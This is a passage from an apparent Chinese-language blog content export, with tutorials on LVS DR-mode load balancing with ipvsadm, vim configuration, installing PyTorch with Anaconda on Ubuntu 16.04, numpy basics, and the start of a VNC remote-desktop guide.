<p>基础知识：在一个局域网内，如果主机A的arp表中无主机B的mac地址且要发送数据包到主机B，就会进行arp请求。这个时候主机B会发送响应请求，告诉主机A它的IP和对应的MAC地址。</p>
</blockquote>
<p>配置文件：<code>/proc/sys/net/ipv4/conf/</code></p>
<ul>
<li>对于<code>arp_ignore</code>控制系统在收到外部的arp请求时，是否要返回arp响应,<strong>配置为1</strong><blockquote>
<p>arp_ignore为0：回应任何网络接口（网卡）上对任何本机IP地址的arp查询请求<br>为1：只回答目标IP地址是本机上来访网络接口（网卡）IP地址的ARP查询请求 。比如eth0=192.168.0.1/24,eth1=10.1.1.1/24,那么即使eth0收到来自10.1.1.2这样地址发起的对192.168.0.1的查询会回应，而对10.1.1.1 的arp查询不会回应。</p>
</blockquote>
</li>
<li><code>arp_announce</code>定义将自己地址向外通告时的通告级别，<strong>配置为2</strong><blockquote>
<p>0：将本地任何接口上的任何地址向外通告；<br>1：试图仅向目标网络通告与其网络匹配的地址；<br>2：仅向与本地接口上地址匹配的网络进行通告</p>
</blockquote>
</li>
</ul>
<h2 id="2-DR实验"><a href="#2-DR实验" class="headerlink" title="2. DR实验"></a>2. DR实验</h2><h3 id="2-1-lvs简介"><a href="#2-1-lvs简介" class="headerlink" title="2.1 lvs简介"></a>2.1 lvs简介</h3><p>lvs： Linux Virtual Server，linux虚拟服务器。<br>核心程序：ipvs（嵌入到了Linux内核中）<br>管理程序：ipvsadm<br>调度算法：</p>
<table>
<tr><td colspan="2">调度方式</td><td>英文</td><td>描述</td></tr>
<tr><td rowspan="4">静态调度</td><td>轮询调度</td><td>Round Robin 简称'RR'</td><td>依次循环的方式将请求调度到不同的服务器上</td></tr>
<tr><td>加权轮询调度</td><td>Weight Round Robin 简称'WRR'</td><td>权值越高的服务器，处理的请求越多</td></tr>
<tr><td>目标地址散列调度</td><td>Destination Hashing 简称'DH'</td><td>算法先根据请求的目标IP地址，作为散列键（Hash Key）从静态分配的散列表找出对应的服务器，若该服务器是可用的且并未超载，将请求发送到该服务器，否则返回空</td></tr>
<tr><td>源地址散列调度</td><td>Source Hashing  简称'SH'</td><td>先根据请求的源IP地址，作为散列键（Hash Key）从静态分配的散列表找出对应的服务器，若该服务器是可用的且并未超载，将请求发送到该服务器，否则返回空。</td></tr>
<tr><td rowspan="6">动态调度</td><td>最小连接调度</td><td>Least Connections 简称'LC'</td><td>新的连接请求分配到当前连接数最小的服务器</td></tr>
<tr><td>加权最小连接调度</td><td>Weight Least Connections 简称'WLC'</td><td>加权最小连接调度在调度新连接时尽可能使服务器的已建立连接数和其权值成比例。调度器可以自动问询真实服务器的负载情况，并动态地调整其权值</td></tr>
<tr><td>最短的期望的延迟</td><td>Shortest Expected Delay 简称'SED'</td><td>请求交给得出运算结果最小的服务器</td></tr>
<tr><td>最少队列调度</td><td>Never Queue 简称'NQ'</td><td>无需队列。如果有realserver的连接数等于0就直接分配过去，不需要在进行SED运算。</td></tr>
<tr><td>带复制的基于局部性的最少连接</td><td>Locality-Based Least Connections with Replication  简称'LBLCR'</td><td>按'最小连接'原则从该服务器组中选出一一台服务器，若服务器没有超载，将请求发送到该服务器；若服务器超载，则按'最小连接'原则从整个集群中选出一台服务器，将该服务器加入到这个服务器组中，将请求发送到该服务器。同时，当该服务器组有一段时间没有被修改，将最忙的服务器从服务器组中删除，以降低复制的程度。</td></tr>
<tr><td>基于局部的最少连接</td><td>Locality-Based Least Connections 简称'LBLC'</td><td>LBLC调度算法先根据请求的目标IP地址找出该目标IP地址最近使用的服务器，若该服务器是可用的且没有超载，将请求发送到该服务器；若服务器不存在，或者该服务器超载且有服务器处于一半的工作负载，则使用'最少连接'的原则选出一个可用的服务器，将请求发送到服务器。</td></tr>
</table>

<h3 id="2-2-ipvsadm的使用"><a href="#2-2-ipvsadm的使用" class="headerlink" title="2.2 ipvsadm的使用"></a>2.2 ipvsadm的使用</h3><p>配置主要分为两个阶段，第一配置哪些数据包需要进行转发，第二配置数据包转发到哪里去。</p>
<ul>
<li><p>安装管理模块</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">centOS: yum install ipvsadm -y</span><br></pre></td></tr></table></figure>
</li>
<li><p>配置哪些数据包需要lvs转发</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">格式： ipvsadm -A -t|u|f ServerAddress [-s schduler]</span><br><span class="line">-t: tcp协议的集群 地址为IP:PORT</span><br><span class="line">-u: udp协议的集群 地址为IP:PORT</span><br><span class="line">-f: 防火墙标记 地址为MarkNumber</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>eg：<code>ipvsadm -A -t 192.168.10.10:80 -s rr</code> 目的地址为192.168.10.10:80的tcp协议的数据包需要进行lvs，使用rr调度算法进行负载均衡。</p>
<ul>
<li>配置数据包转发到RealServer<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">格式：ipvsadm -a -t|u|f service-address -r server-address [-g|i|m] [-w weight]</span><br><span class="line">前部分是配置的哪些数据包需要lvs转发，即配置的集群服务</span><br><span class="line">-r 该参数后面是RealServer的地址，可以是IP:PORT</span><br><span class="line">-g DR模式</span><br><span class="line">-i Tunnel模式</span><br><span class="line">-m NAT模式</span><br><span class="line">-w 该参数和值定义服务器权重</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>eg: <code>ipvsadm -a -t 192.168.10.10:80 -r 192.168.10.8 –g</code></p>
<h3 id="2-3-实验拓扑"><a href="#2-3-实验拓扑" class="headerlink" title="2.3 实验拓扑"></a>2.3 实验拓扑</h3><p><img src="/images/balanceLvs/drModel1.png" alt="topu"><br>蓝色的路径是请求数据包的路线，绿色的是响应数据包的路线。忽略了网关。</p>
<h3 id="2-4-实验过程"><a href="#2-4-实验过程" class="headerlink" title="2.4 实验过程"></a>2.4 实验过程</h3><ul>
<li>step1: 三台虚拟机，eth0在同一个网络192.168.10.0</li>
<li>step2: 配置node1(lvs)的VIP<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ifconfig eth0:0 192.168.10.10/24</span><br><span class="line">echo “1” &gt; /proc/sys/net/ipv4/ip_forward</span><br></pre></td></tr></table></figure>

</li>
</ul>
<blockquote>
<p>注意：当计算机收到一个目的地址不属于自己IP的数据包时候默认会丢弃，因此lvs这个需要设置ip_forward的值为1，充当路由器的功能，将数据包转发出去。</p>
<ul>
<li>step3: 修改RealServer的arp响应和通告级别</li>
</ul>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo “1” &gt; /proc/sys/net/ipv4/ip_forward</span><br><span class="line">echo 1  &gt; /proc/sys/net/ipv4/conf/eth0/arp_ignore</span><br><span class="line">echo 2  &gt; /proc/sys/net/ipv4/conf/eth0/arp_announce</span><br><span class="line">echo 1  &gt; /proc/sys/net/ipv4/conf/all/arp_ignore</span><br><span class="line">echo 2  &gt; /proc/sys/net/ipv4/conf/all/arp_announce</span><br></pre></td></tr></table></figure>

<ul>
<li>step4: 配置每一台RealSerer的VIP(隐藏IP)<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ifconfig lo:8 192.168.10.10 netmask 255.255.255.255</span><br></pre></td></tr></table></figure>

</li>
</ul>
<blockquote>
<p>注意: 响应和通告级别一定要先配置，不然VIP后被通告出去。</p>
</blockquote>
<p>至此，三个节点的信息如下<br><img src="/images/balanceLvs/nodes.png" alt="nods"></p>
<ul>
<li>step5: 启动RrealServer上的httpd<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum install httpd -y</span><br><span class="line">#启动命令</span><br><span class="line">service httpd start</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>静态网页的路径<code>/var/www/html</code></p>
<p>#参考文献<br>[1] <a href="http://www.linuxvirtualserver.org/zh/index.html" target="_blank" rel="noopener">http://www.linuxvirtualserver.org/zh/index.html</a><br>[2] <a href="https://www.cnblogs.com/gaoxu387/p/7941381.html" target="_blank" rel="noopener">https://www.cnblogs.com/gaoxu387/p/7941381.html</a><br>[3] <a href="https://blog.csdn.net/weixin_40470303/article/details/80541639" target="_blank" rel="noopener">https://blog.csdn.net/weixin_40470303/article/details/80541639</a></p>
]]></content>
      <categories>
        <category>tool</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>configurationARGS</title>
    <url>/2019/10/07/configurationARGS/</url>
    <content><![CDATA[<h1 id="常用配置参数"><a href="#常用配置参数" class="headerlink" title="常用配置参数"></a>常用配置参数</h1><h2 id="1-vim的配置参数"><a href="#1-vim的配置参数" class="headerlink" title="1. vim的配置参数"></a>1. vim的配置参数</h2><a id="more"></a>
<p>针对每一个用户修改，在/etc/vimrc中是所有用户生效</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim ~/.vimrc</span><br></pre></td></tr></table></figure>

<p>输入如下配置：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;关闭vim一致性原则</span><br><span class="line">set nocompatible</span><br><span class="line">&quot;显示行号</span><br><span class="line">set number</span><br><span class="line">&quot;设置在编辑过程中右下角显示光标的行列信息</span><br><span class="line">set ruler</span><br><span class="line">&quot;在状态栏显示正在输入的命令</span><br><span class="line">set showcmd</span><br><span class="line">&quot;设置历史记录条数</span><br><span class="line">set history=1000</span><br><span class="line">&quot;设置取消备份 禁止临时文件的生成</span><br><span class="line">set nobackup</span><br><span class="line">set noswapfile</span><br><span class="line">&quot;设置匹配模式</span><br><span class="line">set showmatch</span><br><span class="line">&quot;设置C/C++方式自动对齐</span><br><span class="line">set autoindent</span><br><span class="line">set cindent</span><br><span class="line">&quot;开启语法高亮功能</span><br><span class="line">syntax on</span><br><span class="line">&quot;指定配色方案为256色</span><br><span class="line">set t_Co=256</span><br><span class="line">&quot;设置搜索时忽略大小写</span><br><span class="line">set ignorecase</span><br><span class="line">&quot;配置backspace的工作方式</span><br><span class="line">set backspace=indent,eol,start</span><br><span class="line">&quot;设置在vim中可以使用鼠标</span><br><span class="line">set mouse=a</span><br><span class="line">&quot;设置tab宽度</span><br><span class="line">set tabstop=4</span><br><span class="line">&quot;设置自动对齐空格数</span><br><span class="line">set shiftwidth=4</span><br><span class="line">&quot;设置退格键时可以删除4个空格</span><br><span class="line">set smarttab</span><br><span class="line">set softtabstop=4</span><br><span class="line">&quot;将tab键自动转换为空格</span><br><span class="line">set expandtab</span><br></pre></td></tr></table></figure>

<p>最后使配置生效</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">source ~/.vimrc</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>tool</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>conf</tag>
      </tags>
  </entry>
  <entry>
    <title>pytorchEnvInUbuntu1604</title>
    <url>/2019/10/07/pytorchEnvInUbuntu1604/</url>
    <content><![CDATA[<h1 id="ubuntu16-04中搭建PyTorch环境"><a href="#ubuntu16-04中搭建PyTorch环境" class="headerlink" title="ubuntu16.04中搭建PyTorch环境"></a>ubuntu16.04中搭建PyTorch环境</h1><p><a href="https://pytorch.org/get-started/locally/" target="_blank" rel="noopener">官网链接</a></p>
<a id="more"></a>
<h2 id="1-选择的环境"><a href="#1-选择的环境" class="headerlink" title="1.选择的环境"></a>1.选择的环境</h2><ul>
<li><p>Anaconda<br>原因：python搭建torch，numpy等模块太费劲，需要下载源代码编译安装等。直接选择anaconda比较简单。不需要处理复杂的包依赖关系</p>
<h2 id="2-安装过程"><a href="#2-安装过程" class="headerlink" title="2.安装过程"></a>2.安装过程</h2></li>
<li><p>step1: 安装Anaconda</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># The version of Anaconda may be different depending on when you are installing`</span><br><span class="line">curl -O https://repo.anaconda.com/archive/Anaconda3-5.2.0-Linux-x86_64.sh</span><br><span class="line">sh Anaconda3-5.2.0-Linux-x86_64.sh</span><br></pre></td></tr></table></figure>
</li>
<li><p>step2: 使配置文件生效</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">source ~/.bashrc</span><br></pre></td></tr></table></figure>

</li>
</ul>
<blockquote>
<p>还可以通过重启来使之生效reboot</p>
<ul>
<li>step3: 安装pyTorch</li>
</ul>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">conda install pytorch torchvision cpuonly -c pytorch</span><br></pre></td></tr></table></figure>

<h2 id="3-安装过程的一些麻烦事"><a href="#3-安装过程的一些麻烦事" class="headerlink" title="3.安装过程的一些麻烦事"></a>3.安装过程的一些麻烦事</h2><p>Anaconda安装后默认使用它带的python环境，为了不影响其他python程序的运行，如（VNCServer），会出现<strong>终端调不出来</strong>的情况。<br>需要重新配置环境变量。<br><br>找到~/.bashrc文件中的如下语句（路径可能随系统不同而变化）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export PATH=&quot;/root/anaconda2/bin:$PATH&quot;</span><br></pre></td></tr></table></figure>

<p>修改为下面的语句：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export PATH=&quot;$PATH:/root/anaconda2/bin&quot;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>这个时候在终端运行<code>python --version</code>是系统配置的python环境了，需要anaconda的python环境，只需要找到anaconda安装目录下的bin文件即可。</p>
</blockquote>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>PyTorch</tag>
      </tags>
  </entry>
  <entry>
    <title>numpyPractice</title>
    <url>/2019/10/05/numpyPractice/</url>
    <content><![CDATA[<h1 id="numpy-Numerical-Python-数值计算基础"><a href="#numpy-Numerical-Python-数值计算基础" class="headerlink" title="numpy (Numerical Python)数值计算基础"></a>numpy (Numerical Python)数值计算基础</h1><p><a href="https://numpy.org/" target="_blank" rel="noopener">官网链接</a></p>
<a id="more"></a>
<h1 id="一-简介"><a href="#一-简介" class="headerlink" title="一. 简介"></a>一. 简介</h1><ul>
<li>python 语言数值计算扩充库</li>
<li>强大的高维数组处理和矩阵运算能力</li>
<li>NumPy 的主要对象是多维数组 Ndarray</li>
</ul>
<h1 id="二-应用demo"><a href="#二-应用demo" class="headerlink" title="二. 应用demo"></a>二. 应用demo</h1><h2 id="1-导入模块与查看版本信息"><a href="#1-导入模块与查看版本信息" class="headerlink" title="1.导入模块与查看版本信息"></a>1.导入模块与查看版本信息</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import numpy as np</span><br><span class="line">print(np.__version__)</span><br></pre></td></tr></table></figure>

<h2 id="2-创建数组"><a href="#2-创建数组" class="headerlink" title="2.创建数组"></a>2.创建数组</h2><blockquote>
<p>主要创建数组的途径<br></p>
<ul>
<li>从 Python 数组结构列表，元组等转换。</li>
<li>使用 np.arange、np.ones、np.zeros 等 NumPy 原生方法。</li>
<li>从存储空间读取数组。</li>
<li>通过使用字符串或缓冲区从原始字节创建数组。</li>
<li>使用特殊函&emsp;&emsp;数，如 random。</li>
</ul>
</blockquote>
<h3 id="2-1-通过列表创建数组"><a href="#2-1-通过列表创建数组" class="headerlink" title="2.1 通过列表创建数组"></a>2.1 通过列表创建数组</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 一维数组</span><br><span class="line">a = np.array([1, 2, 3])</span><br><span class="line">print(a)</span><br><span class="line"># 二维数组</span><br><span class="line">b = np.array([(1, 2, 3), (4, 5, 6)])</span><br><span class="line">print(b)</span><br></pre></td></tr></table></figure>

<h3 id="2-2-使用原生方法"><a href="#2-2-使用原生方法" class="headerlink" title="2.2 使用原生方法"></a>2.2 使用原生方法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#创建全为0的数组</span><br><span class="line">a = np.zeros((3, 3))</span><br><span class="line">print(a)</span><br><span class="line"></span><br><span class="line">#创建全为1的数组</span><br><span class="line">b = np.ones((2, 2, 4))</span><br><span class="line">print(b)</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>说明</strong> : numpy.ones(shape, dtype=None, order=’C’)，shape指定数组的形状,每个轴的长度</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#创建一维等差数组</span><br><span class="line">a = np.arange(5)</span><br><span class="line">print(a)</span><br><span class="line"># 结果：[0 1 2 3 4]</span><br><span class="line"></span><br><span class="line">#创建二维等差数组</span><br><span class="line">b = np.arange(6).reshape(2, 3)</span><br><span class="line">print(b)</span><br><span class="line"># 结果：[[0 1 2]</span><br><span class="line">#       [3 4 5]]</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>arange说明</strong> <br></p>
<ul>
<li>格式： numpy.arange(start, stop, step, dtype=None)<br></li>
<li>[start, stop) 半开半闭区间内创建一系列均匀间隔的值</li>
</ul>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 创建二维单位阵</span><br><span class="line">a = np.eye(3)</span><br><span class="line">print(a)</span><br><span class="line"># 结果：</span><br><span class="line"># [[1. 0. 0.]</span><br><span class="line">#  [0. 1. 0.]</span><br><span class="line">#  [0. 0. 1.]]</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>eye说明</strong> <br></p>
<ul>
<li>格式： numpy.eye(N, M=None, k=0, dtype=&lt;type ‘float’&gt;) <br></li>
<li>k：对角线索引：0（默认）是指主对角线，正值是指上对角线，负值是指下对角线</li>
</ul>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 创建等间隔的一维数组</span><br><span class="line">a = np.linspace(1, 10, num=7)</span><br><span class="line">print(a)</span><br><span class="line"># 结果 [ 1 2.5 4 5.5 7 8.5 10. ]</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>linspace说明</strong> <br></p>
<ul>
<li>格式： numpy.linspace(start, stop, num=50, endpoint=True, retstep=False, dtype=None) 同arange<br></li>
<li>endpoint 指示是否最后一个样本包含在序列内</li>
</ul>
</blockquote>
<h3 id="2-3-使用特殊函数创建数组"><a href="#2-3-使用特殊函数创建数组" class="headerlink" title="2.3 使用特殊函数创建数组"></a>2.3 使用特殊函数创建数组</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 创建二维随机数组</span><br><span class="line">a = np.random.rand(2, 3)</span><br><span class="line">print(a)</span><br><span class="line"></span><br><span class="line"># 结果： [[0.72448631 0.19235668 0.00701753]</span><br><span class="line">        [0.05801567 0.9642479  0.22793563]]</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>rand()说明</strong> <br><br>括号内指定数组的形状 <br><br>使用[0, 1)之间的数随机填充</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 创建二维随机数组(数值&lt;5)</span><br><span class="line">a = np.random.randint(5, size=(2, 4))</span><br><span class="line">print(a)</span><br><span class="line"># 结果：</span><br><span class="line">[[3 1 2 0]</span><br><span class="line"> [1 4 2 2]]</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>randint()说明</strong> <br><br>格式： randint(low, high, size, dtype) <br><br>生成[low, high) 的随机数<br>一维数组的时候size参数可直接填数字  eg:<code>randint(1, 3, 10)</code></p>
</blockquote>
<h3 id="2-4-从已知数据创建"><a href="#2-4-从已知数据创建" class="headerlink" title="2.4 从已知数据创建"></a>2.4 从已知数据创建</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 使用lambda创建数组</span><br><span class="line">a = np.fromfunction(lambda i, j: i + j, (3, 3))</span><br><span class="line">print(a)</span><br><span class="line"># 结果：</span><br><span class="line">#[[0. 1. 2.]</span><br><span class="line">#[1. 2. 3.]</span><br><span class="line">#[2. 3. 4.]]</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>fromfunction说明</strong><br><br>格式： fromfunction（function，shape）：通过函数返回值来创建多维数组</p>
</blockquote>
<h2 id="3-数组运算"><a href="#3-数组运算" class="headerlink" title="3. 数组运算"></a>3. 数组运算</h2><h3 id="3-1-一维数组的四则运算"><a href="#3-1-一维数组的四则运算" class="headerlink" title="3.1 一维数组的四则运算"></a>3.1 一维数组的四则运算</h3><p>生成两个Ndarry<br></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a = np.array([10, 20, 30, 40, 50])</span><br><span class="line">b = np.arange(1, 6)</span><br><span class="line">#b数组：[1 2 3 4 5]</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c = a + b</span><br><span class="line">print(&quot;c: &quot;, end=&quot;&quot;)</span><br><span class="line">#结果： [11 22 33 44 55]</span><br><span class="line">c = a - b</span><br><span class="line">c = a * b</span><br><span class="line">c = a / b</span><br></pre></td></tr></table></figure>

<p><strong>注意</strong> ：<strong>数组大小不一样会发生异常</strong></p>
<h3 id="3-2-二维数组（矩阵）的运算"><a href="#3-2-二维数组（矩阵）的运算" class="headerlink" title="3.2 二维数组（矩阵）的运算"></a>3.2 二维数组（矩阵）的运算</h3><p>生成两个Ndarry <br></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a = np.array([[1, 2], [3, 4]])</span><br><span class="line">b = np.array([[5, 6], [7, 8]])</span><br></pre></td></tr></table></figure>

<p>同一维数组一样，可以进行个元素分别的四则运算</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c = a + b</span><br><span class="line">c = a * b</span><br></pre></td></tr></table></figure>

<p>但是矩阵乘法是不一样的： 矩阵m*n与矩阵n*p的矩阵是m*p</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#矩阵乘法</span><br><span class="line">c = np.dot(a, b)</span><br><span class="line"></span><br><span class="line">c = np.mat(a) * np.mat(b)</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>注意</strong><br><br>这里的a, b都是二维数组，所以用dot进行运算<br><br>可以使用np.mat(a)将二维数组转换为矩阵，直接使用*</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 矩阵数乘</span><br><span class="line">c = 2 * a</span><br><span class="line"></span><br><span class="line"># 矩阵转置</span><br><span class="line">c = a.T</span><br><span class="line"></span><br><span class="line"># 矩阵求逆</span><br><span class="line">c = np.linalg.inv(a)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>np.linalg中涉及到矩阵的计算方法，求解特征值、特征向量、逆矩阵等</p>
</blockquote>
<h2 id="4-数组索引和切片"><a href="#4-数组索引和切片" class="headerlink" title="4. 数组索引和切片"></a>4. 数组索引和切片</h2><h3 id="4-1-一维数组"><a href="#4-1-一维数组" class="headerlink" title="4.1 一维数组"></a>4.1 一维数组</h3><p>一个一维数组</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a = np.array([1, 2, 3, 4, 5])</span><br></pre></td></tr></table></figure>

<p>一维数组索引</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">print(a[0], a[-1])</span><br><span class="line"># 结果： 1 5</span><br></pre></td></tr></table></figure>

<p>一维数组切片</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a = np.array([1, 2, 3, 4, 5])</span><br><span class="line"></span><br><span class="line">print(a[0:2])</span><br><span class="line"># 结果 [1 2]</span><br><span class="line"></span><br><span class="line">print(a[:-1])</span><br><span class="line"># 结果 [1 2 3 4]</span><br></pre></td></tr></table></figure>

<h3 id="4-2-二维数组"><a href="#4-2-二维数组" class="headerlink" title="4.2 二维数组"></a>4.2 二维数组</h3><p>一个二维数组</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a = np.array([(1, 2, 3), (4, 5, 6), (7, 8, 9)])</span><br></pre></td></tr></table></figure>

<p>二维数组索引</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a = np.array([(1, 2, 3), (4, 5, 6), (7, 8, 9)])</span><br><span class="line">print(a[0])</span><br><span class="line"># 结果： [1 2 3]</span><br><span class="line"></span><br><span class="line">print(a[-1])</span><br><span class="line"># 结果： [7 8 9]</span><br></pre></td></tr></table></figure>

<p>二维数组切片</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a = np.array([(1, 2, 3), (4, 5, 6), (7, 8, 9)])</span><br><span class="line"></span><br><span class="line">print(a[0:3, 1]) #等价于a[:, 1]</span><br><span class="line"># 结果： [2 5 8]  取第2列</span><br><span class="line"></span><br><span class="line"># 取第二三行</span><br><span class="line">print(a[1:3, :])</span><br><span class="line"># 结果：</span><br><span class="line"># [[4 5 6]</span><br><span class="line"># [7 8 9]]</span><br></pre></td></tr></table></figure>

<blockquote>
<p>(a, c)括号前面控制的是选取的行， 后面控制的是列。</p>
</blockquote>
<h2 id="5-数组形状操作"><a href="#5-数组形状操作" class="headerlink" title="5. 数组形状操作"></a>5. 数组形状操作</h2><ul>
<li><p>查看数组形状</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a = np.random.random((3, 2))</span><br><span class="line">print(a)</span><br><span class="line">print(a.shape)</span><br><span class="line"># result: (3, 2)</span><br></pre></td></tr></table></figure>
</li>
<li><p>更改数组形状（不改变原始数组）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a = np.random.randint(1, 10, 6).reshape(3, 2)</span><br><span class="line">print(a)</span><br><span class="line">c = a.reshape((2, 3))</span><br><span class="line">print(c)</span><br></pre></td></tr></table></figure>

</li>
</ul>
<blockquote>
<p><strong>说明</strong> <br></p>
<ol>
<li>numpy.reshape() 等效于 ndarray.reshape()。<br></li>
<li>numpy.reshape(a, newshape)。 其中newshape 用于指定新的形状(整数或者元组)。</li>
</ol>
</blockquote>
<ul>
<li><p>更改数组形状（改变原始数组）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a = np.random.randint(1, 10, 6).reshape(3, 2)</span><br><span class="line">print(a)</span><br><span class="line">a.resize(2, 3)</span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure>
</li>
<li><p>数组扁平化(变为一维数组)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a = np.random.randint(1, 10, 6).reshape(3, 2)</span><br><span class="line">print(a)</span><br><span class="line">c = np.ravel(a)</span><br><span class="line">d = a.ravel()</span><br></pre></td></tr></table></figure>

</li>
</ul>
<blockquote>
<p>numpy.ravel(a, order=’C’) 按行读取<br>numpy.ravel(a, order=’F’) 按列读取</p>
</blockquote>
<ul>
<li>垂直方向堆叠数组<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a = np.random.randint(10, size=(2, 2))</span><br><span class="line">b = np.random.randint(10, size=(2, 2))</span><br><span class="line">print(a)</span><br><span class="line">print(b)</span><br><span class="line">c = np.vstack((a, b))</span><br><span class="line">print(c)</span><br></pre></td></tr></table></figure>

</li>
</ul>
<blockquote>
<p>输出 <br><br>a: [[2 9] [8 1]] <br><br>b: [[1 5] [0 1]]<br>c: [[2 9] [8 1] [1 5] [0 1]] <br><br> 拓展 d = np.hstack((a, b))  水平方向上堆叠数组</p>
</blockquote>
<h2 id="6-数组排序与统计"><a href="#6-数组排序与统计" class="headerlink" title="6. 数组排序与统计"></a>6. 数组排序与统计</h2><ul>
<li><p>返回每列最大值</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a = np.array(([1, 4, 3], [6, 2, 9], [4, 7, 2]))</span><br><span class="line">c = np.max(a, axis=0)</span><br><span class="line">print(c)</span><br><span class="line"># result： [6 7 9]</span><br></pre></td></tr></table></figure>
</li>
<li><p>返回每行最小值</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a = np.array(([1, 4, 3], [6, 2, 9], [4, 7, 2]))</span><br><span class="line">c = np.min(a, axis=1)</span><br><span class="line">print(c)</span><br><span class="line"># result: [1 2 2]</span><br></pre></td></tr></table></figure>

</li>
</ul>
<ul>
<li><p>返回每列最大值索引</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a = np.array(([1, 4, 3], [6, 2, 9], [4, 7, 2]))</span><br><span class="line">c = np.argmax(a, axis=0)</span><br><span class="line">print(c)</span><br><span class="line"># result: [1 2 1]</span><br></pre></td></tr></table></figure>
</li>
<li><p>返回每行最小值索引</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a = np.array(([1, 4, 3], [6, 2, 9], [4, 7, 2]))</span><br><span class="line">c = np.argmin(a, axis=1)</span><br><span class="line">print(c)</span><br><span class="line"># result: [0 1 2]</span><br></pre></td></tr></table></figure>
</li>
<li><p>统计数组各列的中位数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a = np.array(([1, 4, 3], [6, 2, 9], [4, 7, 2]))</span><br><span class="line">c = np.median(a, axis=0)</span><br><span class="line">print(c)</span><br><span class="line"># result: [4. 4. 3.]</span><br></pre></td></tr></table></figure>
</li>
<li><p>其他</p>
<blockquote>
<p> np.mean(a, axis=1)统计数组各行的算术平均值 <br><br>np.average(a, axis=0)统计数组各列的加权平均值 <br><br>np.var(a, axis=1)统计数组各行的方差 <br><br>np.std(a, axis=0) 统计数组各列的标准偏差<br></p>
</blockquote>
</li>
</ul>
]]></content>
      <categories>
        <category>Numpy</category>
      </categories>
      <tags>
        <tag>Numpy</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>ubuntu1604vnc</title>
    <url>/2019/10/05/ubuntu1604vnc/</url>
    <content><![CDATA[<h1 id="ubuntu16-04-VNC远程桌面"><a href="#ubuntu16-04-VNC远程桌面" class="headerlink" title="ubuntu16.04 VNC远程桌面"></a>ubuntu16.04 VNC远程桌面</h1><h2 id="1-VNC简介"><a href="#1-VNC简介" class="headerlink" title="1. VNC简介"></a>1. VNC简介</h2><a id="more"></a>
<ul>
<li>VNC(Virtual Network Console):虚拟网络控制台，一个远程控制的工具软件 <br></li>
<li>VNC包括四个命令：<strong>vncserver</strong>, <strong>vncviewer</strong>, vncpasswd, vncconnect.</li>
